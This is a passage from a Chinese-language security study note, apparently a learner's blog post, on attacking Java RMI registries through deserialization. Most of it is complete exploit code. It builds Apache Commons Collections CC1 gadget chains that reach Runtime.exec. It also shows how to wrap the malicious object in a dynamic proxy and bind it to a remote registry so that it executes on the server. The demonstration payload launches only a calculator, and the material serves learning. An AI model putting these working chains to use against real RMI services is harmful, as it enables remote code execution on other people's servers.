                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                ),
                new ConstantTransformer(1)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer("fake"));

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashMap outerMap = new HashMap();
        outerMap.put(entry, "bar");

        Field f = LazyMap.class.getDeclaredField("factory");
        f.setAccessible(true);
        f.set(lazyMap, chainedTransformer);

        lazyMap.clear();

        return outerMap;
    }

    public static void main(String[] args) throws Exception {
        new RMIClient().lookup();
    }
}
```
把Server放在本地运行。
远程搭建Client
先运行Server，再运行Client
![](image/386.png)
执行成功，这里用到了一个CC链，现在还不会。
### 攻击Registry
一般Registry和Server是绑定在一起的，攻击Registry其实是攻击与Registry交互的几种方法。当Server的RegistryImpl_Skel对象调用了相应方法时，就有可能被攻击。
#### 调用bind&rebind
我们上面分析过，这两种方法含有readObject()，但是只能接受String和Remote对象的反序列化
```java
var7 = (String)var11.readObject();
var8 = (Remote)var11.readObject();
```
所以这里我们不能直接进行攻击，因为我们的生成的恶意对象是Object类，而Client端`bind`和`rebind`方法只能传入String和Remote类，我们需要使用动态代理将其转为Remote对象，如下
```java
InvocationHandler o=(InvocationHandler)AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[] { Remote.class }, o));
```
进行模拟攻击
Server端
```java
package learn.rmi.serialize;
 
import java.io.Serializable;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.List;
 
public class RMIServer {
 
    public class RMICalc extends UnicastRemoteObject implements ICalc, Serializable {
        protected RMICalc() throws RemoteException{
            super();
        }
 
        @Override
        public Integer sum(List<Integer> lists) throws RemoteException {
            Integer result=0;
            for (Integer list : lists){
                result+=list;
            }
            return result;
        }
 
        @Override
        public Object RMI_Serialize(Object o) throws Exception {
            System.out.println("success");
            return o;
        }
    }
 
    private void register() throws Exception{
 
        RMICalc rmiCalc=new RMICalc();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("rmi://0.0.0.0:1099/calc",rmiCalc);
        System.out.println("Registry运行中......");
    }
 
    public static void main(String[] args) throws Exception {
        new RMIServer().register();
    }
}
```
Client端
```java
package learn.rmi.serialize;
 
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
 
import java.io.Serializable;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;
 
public class RMIClient implements Serializable {
 
    public void lookup() throws Exception{
 
 
        String rmi = "172.27.0.1";
        Integer port=1099;
 
        Registry registry = LocateRegistry.getRegistry(rmi,port);
        registry.bind("ser", (Remote) Exploit());
    }
 
    //恶意对象CC1
    public static Object Exploit() throws Exception{
 
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
 
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
 
 
        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","value");
        Map<Object,Object> transformedMap= TransformedMap.decorate(map,null,chainedTransformer);
 
 
        Class c=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler o=(InvocationHandler)AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
        Remote r = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[] { Remote.class }, o));
        return r;
    }
 
    public static void main(String[] args) throws Exception{
        new RMIClient().lookup();
    }
 
}
```


## 参考文章
https://pankas.top/2022/10/11/%E5%88%9D%E6%8E%A2java%E5%AE%89%E5%85%A8%E4%B9%8Brmi/
https://goodapple.top/archives/321
https://www.cnblogs.com/nice0e3/p/13927460.html
https://goodapple.top/archives/520
Java安全漫谈-RMI篇